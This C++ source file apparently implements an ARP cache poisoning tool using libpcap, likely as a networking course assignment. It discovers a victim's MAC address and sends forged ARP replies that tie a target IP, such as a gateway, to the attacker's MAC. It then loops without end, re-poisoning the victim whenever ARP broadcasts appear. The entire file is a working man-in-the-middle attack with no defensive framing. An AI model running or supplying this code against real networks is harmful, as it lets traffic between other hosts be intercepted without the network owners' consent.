#include "main.h"

void sendArp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac,
			 Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dmac;
	packet.eth_.smac_ = ether_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.op_ = htons(mode);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "[*] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n\n------------------------------\n");
		printf("[*] Infecting packet sending succeeded!");
		printf("\n------------------------------\n\n");
	}
}

EthArpPacket *receiveArp(int mode, pcap_t *handle)
{
	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *arp_packet;
		int result = pcap_next_ex(handle, &header, &arp_packet);
		if (result != 1)
		{
			continue;
		}
		EthArpPacket *arp = (EthArpPacket *)arp_packet;
		
		std::string mode_str;
		if (mode == 1U)
		{
			mode_str = "Request";
		}
		else if (mode == 2U)
		{
			mode_str = "Reply";
		}
		if (ntohs(arp->arp_.op_) == mode && ntohs(arp->eth_.type_) == EthHdr::Arp)
		{
			printf("\n\n------------------------------\n");
			std::cout << "[*] Arp " << mode_str << " Packet captured..\n";
			printf("src ip : %s...\n", std::string(Ip(ntohl(arp->arp_.sip_))).data());
			printf("src mac : %s...\n", std::string(arp->eth_.smac_).data());
			printf("dst ip : %s...\n", std::string(Ip(ntohl(arp->arp_.tip_))).data());
			printf("dst mac : %s...\n", std::string(arp->eth_.dmac_).data());
			printf("------------------------------\n\n\n");
			return arp;
		}
	}
}

void getSenderMac(pcap_t *handle, Mac src_mac, Ip src_ip, char *dst_mac, Ip arp_tip)
{
	sendArp(ArpHdr::Request, handle, Mac("FF:FF:FF:FF:FF:FF"), Mac(src_mac),
			Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));

	EthArpPacket *pkt = receiveArp(ArpHdr::Reply, handle);
	if (pkt->arp_.sip_ == Ip(htonl(arp_tip)) && pkt->arp_.tip_ == Ip(htonl(src_ip)))
	{
		strcpy(dst_mac, std::string(pkt->arp_.smac_).c_str());
	}
	return;
}

int reinfect(pcap_t *handle, char *send_ip, char *tar_ip)
{
	// 'if' condition 1 : broadcast
	// 'if' condition 2, 3 : broadcast from sender or target
	EthArpPacket *pkt = receiveArp(ArpHdr::Request, handle);
	if (strcmp(std::string(pkt->eth_.dmac_).c_str(), "FF:FF:FF:FF:FF:FF") == 0 && (ntohl(pkt->arp_.sip_) == Ip(send_ip) || ntohl(pkt->arp_.sip_) == Ip(tar_ip)))
	{
		printf("[*] sender arp table refreshed!!\n");
		return 1;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc - 1; iter += 2)
	{
		char *dev = argv[1];
		const char *interfaceName = argv[1];

		// Collect host info for ARP packet
		unsigned char att_mac[6];
		char att_ip[INET_ADDRSTRLEN];
		getHostInfo(argv[1], att_mac, att_ip);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// Send ARP Request packet for dst_mac(victim MAC address)
		char send_mac[ETH_ALEN];
		char *send_ip = argv[iter];
		char *tar_ip = argv[iter + 1];

		getSenderMac(handle, Mac(att_mac), Ip(att_ip), send_mac, Ip(send_ip));

		printf("sender MAC : %s\n", send_mac);
		printf("sender IP : %s\n", send_ip);

		// Send ARP Reply packet to infect victim(sender)'s ARP table
		sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));

		// Reinfection
		// Case #1 : sender broadcasts arp request packet (to get gateway's mac)
		// Case #2 : gateway broadcasts arp request packet (to get sender's mac)
		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
		while (true)
		{
			if (reinfect(handle, tar_ip, send_ip) == 1)
			{
				sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
			}
		}

		pcap_close(handle);
	}
}
